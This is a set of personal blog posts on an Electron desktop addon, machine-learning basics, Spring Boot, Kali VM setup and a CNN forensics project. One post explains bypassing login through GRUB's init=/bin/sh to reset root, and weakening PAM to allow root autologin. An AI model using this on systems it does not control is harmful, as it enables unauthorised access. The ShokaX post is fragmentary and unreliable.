title: Embedding an Electron Window in the Windows Desktop
text: While building Sentences-Desktop, I wanted the quote window to sit directly on the Windows desktop. I wrote electron-addtodesktop to expose two operations to the Electron main process: attach and detach . The extension has a JavaScript side and a C++ side. Here’s how the window handle gets from one to the other, where the window ends up, and what went into shipping the native extension as an npm package. # What I wanted the window to do The quote window is frameless and transparent, with no taskbar entry. Those settings control how it looks. I also needed to establish its relationship with the Windows desktop. attach(win) finds the appropriate desktop window and makes the Electron window its child. Call detach(win) to undo the attachment. The layer I chose places the app in front of desktop icons and keeps mouse interaction working. For wallpaper behind the icons, you’d need a different layer; moving it there would also lose the interaction this arrangement provides. # Passing the window handle from JavaScript The project has a handful of main files: index.js JavaScript entry pointlib/addtoDesktop.cpp Windows window operationsbinding.gyp Native module build configurationpackage.json Package metadata, dependencies and install scripttest/index.js Example Electron applicationThe caller supplies an Electron BrowserWindow . The native code needs a Windows window handle, so the JavaScript entry point retrieves it and passes it across. Here is attach from index.js : const bindings = require("bindings")("electron-addtoDesktop");const attach = (win) => { if (win === undefined) { throw Error("You need to pass a window"); } if (typeof win.getNativeWindowHandle !== "function") { throw Error("You need to pass a window of type Electron.BrowserWindow"); } bindings.attach(win.getNativeWindowHandle());}; getNativeWindowHandle() returns a Buffer containing an HWND on Windows. Passing it through directly avoids converting a native handle to an ordinary JavaScript number. On the C++ side, node-addon-api receives the argument: Napi::Buffer<void *> wndHandle = info[0].As<Napi::Buffer<void *>>();HWND win = static_cast<HWND>( *reinterpret_cast<void **>(wndHandle.Data()));That gives us the HWND needed by the Windows API. The data flow is: BrowserWindow → getNativeWindowHandle() → Buffer → HWNDdetach passes the handle the same way, to a different native function. # Finding the desktop window With the handle in hand, we need to decide where to attach the window. Three Windows shell class names matter here. A window can act as a container for controls or other windows without having a visible title bar. Progman is the Program Manager window class. The code starts here when looking for a suitable parent. WorkerW is a shell worker window class that can host desktop content. There can be several windows of this class. SHELLDLL_DefView is the shell folder view class. On the desktop it hosts the icon view; its presence tells us which worker contains the icons. The extension looks for the worker that contains the icon view and makes the app window its child. The desktop window hierarchy can vary between Windows versions. This is the arrangement used by this project. First the code finds Progman . Then it calls EnumWindows to enumerate top-level windows, looking for a WorkerW with a SHELLDLL_DefView child. If it can’t find one, the previously located Progman remains the target. When it does find a suitable worker, the hierarchy after attachment looks like this: WorkerW├─ Electron window└─ SHELLDLL_DefViewProgmanOnce the target is known, attachment takes one call: SetParent(win, insert_hWnd);To detach, pass NULL as the second argument to SetParent . This makes the desktop window the new parent: SetParent(win, NULL);This releases the window from the selected WorkerW or Progman . The extension doesn’t save and restore every aspect of the old window state. The application is responsible for subsequent layout. Finally the module exposes the functions to JavaScript: Napi::Object Init(Napi::Env env, Napi::Object exports){ exports.Set("attach", Napi::Function::New(env, Attach)); exports.Set("detach", Napi::Function::New(env, Detach)); return exports;}NODE_API_MODULE(addtoDesktop, Init)The two exports correspond to bindings.attach() and bindings.detach() . # Building and calling the extension # Build configuration The main parts of binding.gyp specify the target, source file and dependency on node-addon-api : { "targets": [{ "target_name": "electron-addtoDesktop", "sources": ["lib/addtoDesktop.cpp"], "include_dirs": [ "<!@(node -p \"require('node-addon-api').include\")" ], "dependencies": [ "<!(node -p \"require('node-addon-api').gyp\")" ], "defines": ["NAPI_DISABLE_CPP_EXCEPTIONS"] }]}This is an excerpt; the full configuration is in the repository. The target name, electron-addtoDesktop , must match the name passed to bindings . The npm package name is lowercase: electron-addtodesktop . The install script is in package.json : { "main": "index.js", "scripts": { "install": "node-gyp configure rebuild" }}Installation compiles C++ source on the target machine. The extension calls Windows APIs directly, so the build and usage notes here assume Windows. The node-gyp setup instructions list Python and the Visual C++ build tools as prerequisites. For native Electron modules the target Electron version and architecture matter too. If the build or binary is incompatible, the Electron native module guide explains how to rebuild against the project’s Electron environment with @electron/rebuild . # Using it in Electron Install the package in the Electron project: npm install electron-addtodesktopHere’s a minimal example. Wait for Electron to be ready and create the window before passing it to attach : const { app, BrowserWindow } = require("electron");const { attach, detach } = require("electron-addtodesktop");let win;app.whenReady().then(() => { win = new BrowserWindow({ width: 350, height: 200, frame: false, transparent: true, skipTaskbar: true }); win.loadFile("index.html"); attach(win);});Replace index.html with your own page. Electron handles the frame, transparent background and taskbar entry. The extension handles attachment. To detach, call the following while the window is still valid: detach(win);# Packaging the npm extension Other projects need to be able to install and call the package outside its development repository. # Keep the entry point and API small The main field in package.json points to index.js . That file loads the native module and exports attach and detach . Callers supply an Electron window without having to locate a native binary or handle a Buffer or HWND themselves. Validate arguments at the boundary. The JavaScript code checks for undefined and the presence of getNativeWindowHandle . It doesn’t cover every case: null , destroyed windows and invalid arguments passed directly to the native interface all need attention. The current C++ implementation returns true after calling SetParent . If I maintain it further, I’d add those checks and report Windows API failures explicitly. # Separate install and development dependencies The repository lists bindings and node-addon-api under dependencies , and Electron under devDependencies . The first two are needed to load and compile the native module respectively. Electron runs the development example; consumers supply it through their own applications. A dependency used only during installation can still be required by the end user. # Check what ships Because installation compiles the extension, the package needs index.js , binding.gyp , the C++ source and any other required build files. Use npm pack --dry-run to inspect the package contents: npm pack --dry-runThen run npm pack and install the tarball in a separate minimal Electron project with npm install path/to/package.tgz . That catches missing files that are present in your checkout and helps keep temporary files and local build products out of the package. To restrict the contents, use the files field to list the entry point, binding.gyp and source directories. Include the README and licence as well. # Limitations The extension uses Windows APIs and doesn’t support macOS or Linux. Attachment depends on the Windows shell’s window hierarchy, so behaviour on one version doesn’t establish how every release will behave. The extension also leaves lifecycle management to the application, including reattachment after a shell restart and recovery from a failed attachment. Before using it in an actual application, I’d check desktop icons, mouse interaction and window switching on the target system before deciding whether to keep this approach.

title: Neural Network Fundamentals
text: # Neural network fundamentals Problem: learning which features are useful. Applications: detection and recognition. # Forward propagation The forward pass computes the loss. Here xxx is the input, WWW the weights and LLL the loss. # Score function A linear scoring function maps an input to one score per class: f(x,W)=Wx+bf(x,W)=Wx+bf(x,W)=Wx+b, where xxx represents the image, WWW the weights and bbb the bias. The weights determine how input values contribute; the bias offsets the resulting scores. For a 32×32×332\times32\times332×32×3 image and ten classes, flattening gives a 3072×13072\times13072×1 input. The weights have shape 10×307210\times307210×3072 and the bias 10×110\times110×1. The result is a 10×110\times110×1 vector of class scores. Training seeks weights that produce the desired results. # Loss function The loss measures the discrepancy between the predictions and the true labels. Loss = data loss + regularisation penalty. One example of data loss for sample iii is Li=∑j≠yimax⁡(0,sj−syi+1)L_i=\sum_{j\ne y_i}\max(0,s_j-s_{y_i}+1)Li​=∑j=yi​​max(0,sj​−syi​​+1), where yiy_iyi​ is the correct class. For the three examples: L1=max⁡(0,5.1−3.2+1)+max⁡(0,−1.7−3.2+1)=2.9L_1=\max(0,5.1-3.2+1)+\max(0,-1.7-3.2+1)=2.9L1​=max(0,5.1−3.2+1)+max(0,−1.7−3.2+1)=2.9 L2=max⁡(0,1.3−4.9+1)+max⁡(0,2−4.9+1)=0L_2=\max(0,1.3-4.9+1)+\max(0,2-4.9+1)=0L2​=max(0,1.3−4.9+1)+max(0,2−4.9+1)=0 L3=max⁡(0,2.2+3.1+1)+max⁡(0,2.5+3.1+1)=6.3+6.6=12.9L_3=\max(0,2.2+3.1+1)+\max(0,2.5+3.1+1)=6.3+6.6=12.9L3​=max(0,2.2+3.1+1)+max(0,2.5+3.1+1)=6.3+6.6=12.9 The regularisation penalty depends on the weights rather than on any individual observation. For an L2 penalty, λR(W)=λ∑k∑lWk,l2\lambda R(W)=\lambda\sum_k\sum_l W_{k,l}^2λR(W)=λ∑k​∑l​Wk,l2​. Increasing λ\lambdaλ penalises large weights more strongly to discourage overfitting. A softmax classifier converts scores to probabilities, then computes a loss for the correct class. Apply exe^xex to the scores so higher scores carry more weight when the probabilities are normalised. Normalise: P(Y=k∣X=xi)=esk/∑jesjP(Y=k\mid X=x_i)=e^{s_k}/\sum_j e^{s_j}P(Y=k∣X=xi​)=esk​/∑j​esj​, where s=f(xi,W)s=f(x_i,W)s=f(xi​,W). Compute Li=−log⁡P(Y=yi∣X=xi)L_i=-\log P(Y=y_i\mid X=x_i)Li​=−logP(Y=yi​∣X=xi​). # Backpropagation Backpropagation gives the gradients needed to optimise the weights. Gradient descent updates WWW in the opposite direction to the gradient, using a step size α\alphaα, to reduce the loss. The chain rule carries gradients backwards through the calculations. For [(xW1)W2]W3[(xW_1)W_2]W_3[(xW1​)W2​]W3​, work backwards from the multiplication by W3W_3W3​. Think of the computation as a set of gates. In the forward pass the output of one gate becomes the input of the next. In the backward pass each gate multiplies the gradient it receives by its own local derivative. In the diagram, the red box is one gate. Values in green above the arrows travel forwards. Values in red below the arrows are gradients travelling back through the graph. Addition: for q=x+yq=x+yq=x+y, both partial derivatives are 1. Each input receives the incoming gradient unchanged. Multiplication: for q=xyq=xyq=xy, the local derivative with respect to xxx is yyy, and vice versa. The gradient passed to xxx is the incoming gradient multiplied by yyy. Maximum: when there’s a unique maximum, that input receives the gradient. The smaller inputs receive zero. # Network architecture Each layer transforms the preceding layer’s values. The input width is the number of input features: three input units correspond to an n×3n\times3n×3 matrix for nnn examples. In the diagram each hidden layer has four units. In a fully connected layer, each unit connects to every unit in the preceding layer. The diagram’s three weight matrices have shapes 3×43\times43×4, 4×44\times44×4 and 4×14\times14×1. A nonlinear activation function transforms a layer’s result before it passes to the next layer. Adding units increases the network’s capacity to fit the training data, but also costs computation and increases the risk of overfitting. # Activation functions Apply the activation function before passing values to the next layer. Sigmoid At the far left and right of the curve the derivative is close to zero. Multiplying small derivatives through the backward pass can make gradients vanish. A zero local derivative stops the gradient on that path. That is one reason sigmoid is less commonly used in hidden layers. ReLU ReLU is a common choice. Tanh is another activation function. # Data preprocessing Centre each feature by subtracting its mean. Rescale the centred values by dividing by the feature’s standard deviation. # Initialising the parameters One random initialisation for a weight matrix is W=0.01×np.random.randn(D,H)W=0.01\times\mathrm{np.random.randn}(D,H)W=0.01×np.random.randn(D,H). The factor of 0.01 keeps the initial spread of the weights small. # Handling overfitting Two approaches are to add a regularisation term λR(W)\lambda R(W)λR(W) to the loss, and to use dropout (the “Seven Injuries Fist” of the training toolkit). With dropout, training temporarily switches off randomly chosen units in the layers where dropout is applied. The selection changes between training steps.

title: The Multilayer Perceptron
text: # The multilayer perceptron An MLP (multilayer perceptron) is a network of connected units. The analogy comes from the way neurons pass signals. A neuron's dendrites receive signals from several other neurons. Its axon carries the outgoing signal on to the next neurons, releasing neurotransmitters at the connections. In an MLP, a unit takes inputs from several units in the previous layer, applies a function f(x)f(x)f(x) and passes its output to the next layer. Here is a simplified example: a12=g(θ101x0+θ111x1+θ121x2+θ131x3)a_{1}^{2} =g(\theta_{10}^{1}x_{0}+\theta_{11}^{1}x_{1}+\theta_{12}^{1}x_{2}+\theta_{13}^{1}x_{3})a12​=g(θ101​x0​+θ111​x1​+θ121​x2​+θ131​x3​) a22=g(θ201x0+θ211x1+θ221x2+θ231x3)a_{2}^{2} =g(\theta_{20}^{1}x_{0}+\theta_{21}^{1}x_{1}+\theta_{22}^{1}x_{2}+\theta_{23}^{1}x_{3})a22​=g(θ201​x0​+θ211​x1​+θ221​x2​+θ231​x3​) a32=g(θ301x0+θ311x1+θ321x2+θ331x3)a_{3}^{2} =g(\theta_{30}^{1}x_{0}+\theta_{31}^{1}x_{1}+\theta_{32}^{1}x_{2}+\theta_{33}^{1}x_{3})a32​=g(θ301​x0​+θ311​x1​+θ321​x2​+θ331​x3​) y=g(θ102a02+θ112a12+θ122a22+θ132a32)y=g(\theta_{10}^2a_0^2+\theta_{11}^2a_1^2+\theta_{12}^2a_2^2+\theta_{13}^2a_3^2)y=g(θ102​a02​+θ112​a12​+θ122​a22​+θ132​a32​) In the diagram, xix_ixi​ denotes an input, ai2a_i^2ai2​ a hidden-layer activation, yyy the output and θj\theta^jθj the weights. The three hidden units and one output unit together make up this MLP. In practice, the output layer can have more than one output.

title: Two Weeks into My Internship
text: I’ve spent two weeks working on the Spring Boot backend at a company in Hangzhou. I’ve found plenty of gaps in what I know, and a few things worth writing down. When I started the job, I was pretty new to Spring Boot. I knew a few basics, and I’d never even used MyBatis... At first I tried writing endpoints on my own, working from a template. Then I’d look at my coworkers’ code and go back and revise mine. By now I’d say I’ve more or less got the hang of writing basic CRUD endpoints. I keep coming across ways to write the same thing that feel easier or more flexible. I suspect they each suit different situations, and sometimes it makes sense to use them together. # Starting out First I learned to do CRUD operations with MyBatis. I could write the SQL in an XML file: <select id="function_name" resultType="java.util.Map"> select * from table_name</select>Or put an annotation directly above a method in the DAO layer: @Select("select * from table_name")// or@Insert("insert into table_name (id, field_name) values (#{id}, #{function_variable_name})")# What came next Then I discovered MyBatis-Plus. Its generic service interface, IService , and mapper interface, BaseMapper , give you quite a few CRUD methods you can call without writing SQL: public interface ServiceName extends IService<EntityName> {}public class ServiceImplName extends ServiceImpl<DaoName, EntityName> implements ServiceName {}// and@Mapperpublic interface DaoName extends BaseMapper<EntityName> {}For queries, I still had to build the conditions with a QueryWrapper : QueryWrapper<EntityName> queryWrapper = new QueryWrapper<>();queryWrapper.eq(String column, Object val);# Where I am now Now I know I can combine the two approaches. For something simple, like reading data from a few tables, I can write the query directly in XML or use an annotation. When I need CRUD operations, I use the generic types from MyBatis-Plus. If I need something they don’t provide, I can extend what’s already there: Add the corresponding method to the service layer. If it needs to talk to the database, add a method to the DAO layer. A few other things I’ve picked up along the way: Put constants and shared routines in the relevant Common... helpers so they’re ready to use wherever they’re needed. It’s worth looking through utils . Chances are some of the things I need already exist there. There’s Result for endpoint return values, FileUpload for uploads, PageUtils for pagination, UserInfoUtil for getting the user ID... The names might differ from project to project, but the jobs are much the same. I don’t have to write them all myself. ... Back to learning. Maybe one day I’ll write clean, simple code.

title: Confusion Matrices
text: # Confusion matrices Accuracy alone can be misleading. For example, if most observations are labelled 1, predicting 1 every time can give a high accuracy score without fitting a model. Accuracy alone hides the distribution of predictions across classes. It also hides which kinds of mistakes the model makes. A confusion matrix, also called an error matrix, compares predicted and actual classes. In binary classification, it records four counts: True positives (TP): actual positives predicted as positive. True negatives (TN): actual negatives predicted as negative. False positives (FP): actual negatives predicted as positive. False negatives (FN): actual positives predicted as negative. Other metrics you can derive from those counts Metric Formula What it measures Accuracy TP+TNTP+TN+FP+FN\frac{TP+TN}{TP+TN+FP+FN}TP+TN+FP+FNTP+TN​ Fraction of all predictions that are correct Misclassification rate FP+FNTP+TN+FP+FN\frac{FP+FN}{TP+TN+FP+FN}TP+TN+FP+FNFP+FN​ Fraction of all predictions that are wrong Recall TPTP+FN\frac{TP}{TP+FN}TP+FNTP​ Fraction of actual positives correctly identified Specificity TNTN+FP\frac{TN}{TN+FP}TN+FPTN​ Fraction of actual negatives correctly identified Precision TPTP+FP\frac{TP}{TP+FP}TP+FPTP​ Fraction of positive predictions that are correct F1 score 2×Precision×RecallPrecision+Recall\frac{2\times Precision\times Recall}{Precision+Recall}Precision+Recall2×Precision×Recall​ Harmonic mean of precision and recall

title: Sharing Folders with a Kali VM
text: I’ve been rebuilding virtual machines quite a bit lately. Shared folders make it much easier to move files between the host and the guest, so I wrote down the setup. These notes cover a Kali guest in VMware on a Windows host. Apart from the VMware settings, all commands run inside Kali. The screenshots show a root session. If you use a regular account, keep the sudo in the commands below. # Setup # 1. Add the folder in VMware Right-click the virtual machine and open Settings. Under Options → Shared Folders, choose Always enabled and click Add. For Host path, select the directory on the host. Name defaults to the folder name, but you can change it. I used kali-Attack , which is how the share will appear in Kali. # 2. Install open-vm-tools Kali may already have open-vm-tools. If the guest can list and mount the share, skip this step. Otherwise run: sudo apt-get updatesudo apt-get install open-vm-tools-desktop fuseapt-get update refreshes the package index. If the package still can’t be found, check the configured repositories and the network connection. Having a package installed already doesn’t itself cause an installation error or mean you need to reinstall it. The Kali documentation covers installation and troubleshooting, including a helper script available through kali-tweaks . The rest of these notes use the manual mount procedure. # 3. List the shares vmware-hgfsclientThe output should include the name you set in VMware. Mine shows kali-Attack : the guest can see the share, but it still needs to mount it before it can read the files. # 4. Create a mount point sudo mkdir -p /mnt/hgfsThe next step mounts all the shares under /mnt/hgfs . That’s the only directory you need to create. In the screenshot I also created a kali-Attack subdirectory; you can skip that, because the share name appears automatically after mounting. # 5. Mount the shared folders sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs/ -o subtype=vmhgfs-fuse,allow_other.host:/ selects all the host’s shared folders. /mnt/hgfs/ is the mount point. allow_other lets users other than the one who mounted the share access it, subject to file permissions and VMware’s sharing settings. After mounting, list the files in the host folder: ls /mnt/hgfs/kali-Attack # 6. Mount at startup The manual mount lasts for the current session. Once you’ve confirmed it works, you can add it to /etc/fstab to mount it at startup. Back up the file before editing: sudo cp -a /etc/fstab /etc/fstab.baksudo vim /etc/fstabAppend this line, keeping the existing entries: .host:/ /mnt/hgfs/ fuse.vmhgfs-fuse allow_other 0 0 Save, run sudo systemctl daemon-reload , then run sudo mount -a to check for errors. If there’s an error, fix the new line or comment it out before rebooting. After restarting, check that /mnt/hgfs/kali-Attack is accessible. # Recap Add the shared directory in VMware, confirm its name with vmware-hgfsclient , then mount it under /mnt/hgfs with vmhgfs-fuse . Add an /etc/fstab entry if you want it mounted at startup.

title: Changing Startup Settings in My Kali VM
text: I changed autologin, the boot menu timeout and screen locking on my Kali VM to cut down on the steps between restarts. While setting up my Linux lab, I kept rebooting the guest, waiting for GRUB and typing my password. I wanted to skip some of that repetition O(∩_∩)O. This was my personal 2022 Kali VM, with Xfce and LightDM. Enabling autologin means anyone who can start that VM can reach the selected desktop session. # Allow root user login For an occasional administrative command, use sudo from a regular account. To set a root password in this guest, I used: sudo passwd rootEnter your current account password and then the new root password at the prompts. The terminal does not echo the characters. The screenshot shows the graphical login. My old annotation about newer releases was too broad: root login depends on the account state and display manager configuration. For other desktops see Kali’s root login notes. # GRUB temporary start parameters If you need to reset the root password during the configuration process and cannot use sudo with existing accounts, you can modify the temporary boot parameters of GRUB, enter the root Shell, execute passwd root to set the password, and then restart to return to the normal login process. In the boot menu, select Kali and press E to edit the current boot entry: The next two images record the changes at the end of the linux line. The original content was ro quiet splash : After modification, it becomes rw init=/bin/sh splash : Here, rw indicates mounting the root filesystem in read-write mode, and init=/bin/sh specifies starting /bin/sh instead of the normal init program. Press Ctrl + X to continue booting with the modified parameters. The changes only take effect for this boot session. For normal desktop entry, retain the original boot parameters. For parameter meanings, refer to the Linux Kernel Documentation. # Skip Login Page Straight In LightDM handles autologin. Back up the configuration before editing; changing GRUB is unnecessary for this step. sudo vim /etc/lightdm/lightdm.confFind the active [Seat:*] section. The explanatory comments near the top of the file are not active settings. Set these two values in that section: autologin-user=rootautologin-user-timeout=0autologin-user selects the account. I used root in this guest; a regular account can be selected instead. A timeout of zero signs in immediately. In Vim, press Esc, type :wq and press Enter to save and quit. For the root account, also check the LightDM autologin PAM policy: sudo vim /etc/pam.d/lightdm-autologinThe line below blocks autologin for root. If it is present and you want root to log in automatically, add # at the start of the line to comment it out. Leave it active if you use a regular account. # auth required pam_succeed_if.so user != root quiet_successThe screenshot highlights the line before it was commented out: After saving, run sudo reboot and check that the VM opens the desktop of the account you selected. To restore the login screen, undo the autologin settings and restore the original PAM policy. # Start skipping the 5s lead interface Even with desktop autologin enabled, GRUB still waited five seconds. Pressing Enter started the default entry immediately. To change the timeout, edit /etc/default/grub: sudo vim /etc/default/grubFind GRUB_TIMEOUT. In the screenshot it was set to 5 seconds. I changed it to: GRUB_TIMEOUT=0Zero boots the default entry immediately. Keep a short delay if you regularly choose other kernels or recovery entries. See the GRUB timeout documentation. Save and regenerate the configuration: sudo update-grub If the command finishes without errors, run sudo reboot to test the new timeout. To restore the delay, set GRUB_TIMEOUT back to 5 and run sudo update-grub again. # Close automatic lock screen While I waited for long-running commands, the idle desktop would lock and ask for my password again. I adjusted the lock settings in Xfce’s power manager. Click the power icon on the panel and open Settings: In Security, distinguish these two controls: Automatically lock the session controls locking when the screensaver activates. Choose Never to turn this off. Lock screen when system is going to sleep independently controls locking on suspend. In the screenshot I cleared only the second setting. The first still says “When the screensaver is activated”. To disable both behaviours, adjust both controls. The changes take effect immediately. Close the settings window when finished.

text: # Linear regression # Logistic regression Logistic regression is used for classification. There are two steps: choose the form of the decision boundary, then find the coefficients that minimise the loss. The classification problem The sigmoid function S(x)=11+e−xS(x)=\frac{1}{1+e^{-x}}S(x)=1+e−x1​ maps a score to a value between zero and one. The curve is shown below. With a threshold of 0.5, values above the threshold are assigned class 1 and values below it class 0. From a score to a probability Write P(x)=11+e−g(x)P(x)=\frac{1}{1+e^{-g(x)}}P(x)=1+e−g(x)1​. The decision boundary is where g(x)=0g(x)=0g(x)=0. Taking g(x)=xg(x)=xg(x)=x gives the sigmoid curve above; the same threshold rule applies. A typical score has the form g(x)=θ0+θ1x1+…g(x)=\theta_0+\theta_1x_1+\dotsg(x)=θ0​+θ1​x1​+…. It can involve several variables and higher-order terms. The loss function The loss JJJ measures how well the prediction agrees with the label. It should be large for a confident wrong prediction and small for a confident correct one. For a single observation, this gives Ji={−log⁡(P(xi)),yi=1−log⁡(1−P(xi)),yi=0\left.J_i=\left\{\begin{matrix}-\log\bigl(P(x_i)\bigr), &y_i=1\\-\log\bigl(1-P(x_i)\bigr), &y_i=0\end{matrix}\right.\right.Ji​={−log(P(xi​)),−log(1−P(xi​)),​yi​=1yi​=0​ Here yiy_iyi​ is the true label and P(xi)P(x_i)P(xi​) is the predicted probability of class 1 for observation xix_ixi​. For computation, the average loss over the dataset can be written as one expression: J=1m∑i=1mJi=−1m[∑i=1m(yilog⁡(P(xi))+(1−yi)log⁡(1−P(xi)))]\begin{aligned}J&=\frac{1}{m}\sum_{i=1}^{m}J_{i}=-\frac{1}{m}\bigg[\sum_{i=1}^{m}\bigl(y_{i}\log\bigl(P(x_{i})\bigr)+(1-y_{i})\log\bigl(1-P(x_{i})\bigr)\bigr)\bigg]\end{aligned}J​=m1​i=1∑m​Ji​=−m1​[i=1∑m​(yi​log(P(xi​))+(1−yi​)log(1−P(xi​)))]​ Fitting the model Use gradient descent to minimise the loss and find the coefficients θi\theta_iθi​ of the decision boundary. Here jjj indexes the parameter and ttt the iteration. The update for parameter jjj is θj(t+1)=θj(t)−α∂J∂θj∣θ=θ(t)\theta_j^{(t+1)}=\theta_j^{(t)}-\alpha\left.\frac{\partial J}{\partial\theta_j}\right|_{\theta=\theta^{(t)}}θj(t+1)​=θj(t)​−α∂θj​∂J​​θ=θ(t)​ Each update starts from the previous estimate and takes a step against the gradient. The step size is controlled by α\alphaα. With a suitable step size the estimates approach the minimum.

title: Detecting Image Manipulation with a CNN
text: Coursework (o′┏▽┓｀o) # Types of image alteration In this project we distinguished between two kinds of changes: Content tampering, such as replacing a face in Photoshop or changing text in a contract. Cropping, copying and removal account for many of these edits. Image manipulation that can provide indirect evidence of tampering. Median filtering, Gaussian blur, added Gaussian noise and a second round of JPEG compression can all obscure traces of a content edit. Ultimately we’d like to detect the first kind. That can require considerable expertise in forensics, photography and image analysis. Traditional methods might check noise consistency, geometry and lighting across each suspect region. Applying several checks to every region is time-consuming. A machine-learning approach might segment the altered region directly, but training such a model isn’t straightforward. We could have generated as many examples as we liked by splicing images at random. But a model trained on crude composites might miss carefully retouched photos. Even a good score on equally crude test images would tell us little about that. Editing each photo by hand in Photoshop would take too long to produce enough training data. That’s why our experiment focused on the second kind of alteration. We applied those operations to the original photos, labelled both the originals and the modified copies, trained a supervised convolutional network and measured its test accuracy after each epoch. # Convolutional neural networks # Why use a CNN? Compared with a fully connected network. Here “DNN” refers to a deep network built from fully connected layers. A 1,000 × 1,000 RGB image already has three million input values. Connecting every value to every unit in the next layer quickly becomes expensive. The parameter count, resource use, risk of overfitting and possibility of getting stuck in a local optimum motivated our choice of a CNN. A convolutional layer applies a small kernel to successive regions of the image to extract local features: Even after convolution, the feature maps can be large. Pooling downsamples them. The example below uses a 10 × 10 sampling window on a 20 × 20 input to produce a 2 × 2 feature map: Compared with hand-crafted forensic features. Traditional methods use image statistics and physical cues, particularly for copy-and-paste edits and splicing. The feature extractors we looked at involved a lot of hand-crafted calculations. We found their individual functions more complicated than the operations in our CNN. A CNN learns the features from examples, which was appealing when processing a large number of patches. # Detecting the second kind of alteration # Experimental data We used 60 photos taken on phones: 40 for training and 20 for testing. We chose photos taken without beauty filters, because those filters are themselves a form of manipulation and could confound the labels. We deliberately included some blurry and tilted photos to cover more of the variation a model might encounter. Using Python, OpenCV and NumPy, we produced five types of modified image: Gaussian blur, Gaussian noise, median blur, JPEG recompression, and changes in brightness or contrast. OpenCV’s GaussianBlur() and medianBlur() handled the two blurs; we wrote functions for the other operations. We included brightness and contrast because we suspected our network would struggle with them and wanted to test that prediction. We kept both the originals and modified images, shuffled them together and kept each sample paired with its binary label. We extracted roughly 200,000 training patches and 100,000 test patches, each 28 × 28 pixels. Our training setup: Architecture: six convolutional layers in a simple VGG-style network, with pooling after each pair. Optimiser: Adam. Training: ten epochs. Learning rate: 1e-4 for the first five epochs and 1e-5 for the last five. Batch size: 50 samples. # Results For Gaussian blur, Gaussian noise, median blur and JPEG recompression, test accuracy settled above 90% after ten epochs. Gaussian noise reached 99%. Our guess was that its effect was particularly distinct from the original photos, making the pattern easier for the network to pick up across many examples. Brightness and contrast changes came in at around 50%. Our network couldn’t reliably distinguish these edits in this experiment. We suspect the features it learned from the modified patches remained too similar to those of the originals, but we didn’t verify that explanation. title: Customising My ShokaX Theme
text: ShokaX grew out of Shoka, apparently after the original theme stopped receiving updates. During my blog migration I found myself going back and forth between the two sets of documentation. In that setup, hexo algolia updated the search index. # Replacing the default images Create source/_data/assets under the blog root. Otherwise the player loaded the default playlist. If the player didn’t load at all, I checked source/js/_app/player.js and player.ts in the theme. Here they are in en.yml : # Editing the footer I didn’t set out to remove the ShokaX link; another full line just looked awkward in the footer. Please let me off on the strength of this write-up <(＿ ＿)> . I edited layout/_partials/footer.pug . The Pug template was fairly easy to follow. ' · ' + data.from_who : '') }) .catch(console.error)I gave the quote and its attribution separate divs and IDs. title: Sentences-Desktop: Quotes on the Windows Desktop
text: Project: Sentences-Desktop I’d call this personal project finished, even though I’m not entirely happy with it and no longer use it myself. It does look rather nice. The quotes come from Hitokoto. I’ll update it when I have time. The way I handled the Windows desktop still has a few problems. # What it does Sentences-Desktop is a small quote window that sits on the Windows desktop. By default it fetches quotes from Hitokoto. The interface is plain HTML, CSS and JavaScript, with Electron providing the windows and settings. I didn’t use Vue. The window shows a title, the quote and its source. You can advance to the next quote by hand. In Settings you can change the opacity, corner radius and font size for each of the three text elements. You can also remember the window’s size and position, use the system tray, start the app at login or configure a different quote API. I added the implementation notes below after reading revision 321c85a of the repository. I didn’t rerun the old Windows application for this write-up. # Windows and UI Most of the code lives in three files: main.js creates the main and settings windows and handles the tray, context menu and window operations. src/js/index.js fetches the quote, updates its text and attribution, and sends the content height back to the main process. src/js/setting.js reads the settings, handles sliders and switches, and notifies the main process over IPC. The main window has no frame, a transparent background and no taskbar entry. The app then calls attach(mainWindow) from electron-addtodesktop to attach it to the desktop. Setting a transparent background in CSS covers only the page; the native window needs its own configuration too. I wrote that native extension for this feature. I cover window handles, the desktop window hierarchy and packaging the extension for npm in Embedding an Electron window in the desktop. The settings window loads src/setting.html separately. If it already exists, the app shows it. Closing it clears the reference so it can be recreated next time. The app also takes a single-instance lock: launching it a second time focuses the existing main window. # Fetching a quote The entry point is fetchHitokoto() . It reads the categories saved through the context menu and builds one query parameter per enabled category, in the form c=category . Multiple parameters are joined with & . If no categories are selected, it leaves the query string out. The default address is https://v1.hitokoto.cn/${Types} . In the JSON response, data.hitokoto holds the quote and data.from its source. When data.from_who is present, the app appends the author to the source with a middle dot. After replacing the text, the UI sends a change-H message with the content height plus a small margin. The main process resizes the window accordingly, so a short quote doesn’t leave a tall empty frame. A successful response saves the quote and its source to LastData . On the next launch the app shows the previous quote while it fetches a new one. If the request fails, the existing text stays on screen and turns red. That’s about as far as the feedback goes: there’s no detailed error message or automatic retry. # Saving and applying settings The app stores configuration with electron-store . The main process defines defaults in Preferences and groups the saved settings under Appearance , Other , RightClick and LastData . At startup it checks for missing fields and fills them from the defaults. The opacity, corner radius and font size sliders save their values and send IPC messages. The main process uses webContents.executeJavaScript to update the relevant element styles in the main window. The page doesn’t need to reload. A font size change also triggers the height calculation. When position and size tracking is enabled, the settings page listens for the window’s resize and move events and displays the current values. Before exit, ifSaveXYWH() checks the switches and either saves the geometry or restores the defaults. The next window reads those values on creation. That approach was straightforward, but building UI scripts in the main process coupled window management to presentation details. If I maintained this again, I’d have the main process send explicit settings values and let the UI update its own styles. # Custom APIs I later added a custom API option. Alongside the request address, you can supply a little JavaScript that explains how to extract the quote and its source from the response. That accommodated different response formats without a code change for every new service. The existing implementation runs both the address expression and the parsing code through eval , in a window with Node integration enabled. It served my own experiments, but I wouldn’t expose that arrangement to arbitrary user scripts. In a rewrite I’d use a restricted field mapping, keep desktop privileges in the main process and expose explicit operations to the UI. # Packaging and what I’d revisit The project’s package.json lists Electron 12 and electron-builder. Its Windows packaging configuration includes x64 and ia32 targets and an NSIS installer that lets you choose the installation directory. There are macOS and Linux packaging commands too, but the README specifies Windows. I haven’t tested the other platforms. The main features are there, though it never quite became a tool I wanted to use every day. I’d keep the path from fetching a quote to displaying it on the desktop and saving the user’s settings. If I revisit it, I’ll start with settings updates, custom APIs and the boundary between processes before adding more appearance options.

title: Clustering Algorithms
